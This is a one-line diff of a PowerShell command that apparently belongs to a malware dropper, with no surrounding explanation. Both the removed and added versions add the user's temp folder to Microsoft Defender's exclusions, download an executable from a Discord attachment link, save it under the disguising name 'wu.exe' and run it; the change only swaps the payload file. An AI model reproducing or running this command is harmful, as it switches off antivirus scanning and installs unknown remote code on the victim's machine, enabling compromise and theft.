@@ -1,1 +1,1 @@
-$f="$env:TEMP\wu.exe";Add-MpPreference -ExclusionPath $env:TEMP;iwr "https://cdn.discordapp.com/attachments/1517154152700973246/1520357688192667800/collextor_msvc.exe?ex=6a40e6ef&is=6a3f956f&hm=60f146401754cf840dc5bac0025a5d1f1ac8f7284285484d8757b4c9c8e9f4f3&" -OutFile $f;& $f
+$f="$env:TEMP\wu.exe";Add-MpPreference -ExclusionPath $env:TEMP;iwr "https://cdn.discordapp.com/attachments/1517154152700973246/1520358809204166737/scan.exe?ex=6a40e7fb&is=6a3f967b&hm=ddb6983198a9dbcf4f50602c64ea05e0276fea646cf83e5866bd4e8400f00bfb&" -OutFile $f;& $f
